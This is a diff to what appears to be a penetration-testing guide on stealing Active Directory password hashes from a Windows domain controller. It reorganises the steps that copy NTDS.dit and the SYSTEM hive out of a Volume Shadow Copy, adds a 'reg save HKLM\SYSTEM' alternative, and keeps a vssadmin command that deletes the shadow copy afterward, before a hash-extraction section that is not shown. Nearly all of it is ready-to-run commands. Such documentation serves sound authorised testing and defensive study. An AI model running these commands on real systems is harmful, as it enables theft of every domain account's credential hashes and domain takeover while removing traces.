@@ -25,10 +25,24 @@ Successfully created shadow copy for 'C:\'
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
 ```
 
-### Step 2 - Copy NTDS.dit from ShadowCopy
+### Step 2 - Copy NTDS.dit and SYSTEM from ShadowCopy
+
+NTDS:
 
 ```plain
 PS C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\ntds.dit
+```
+
+SYSTEM:
+
+```plain
+PS C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\system32\config\system c:\system
+```
+
+Or use `reg save`
+
+```plain
+reg SAVE HKLM\SYSTEM c:\SYSTEM
 ```
 
 You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html) if you prefer a GUI.
@@ -39,14 +53,6 @@ You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view
 
 ```plain
 PS C:\> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
-```
-
-### Step 4 - Save the SYSTEM file
-
-Save the `SYSTEM` file.
-
-```plain
-reg SAVE HKLM\SYSTEM c:\SYSTEM
 ```
 
 ## Extract hashes
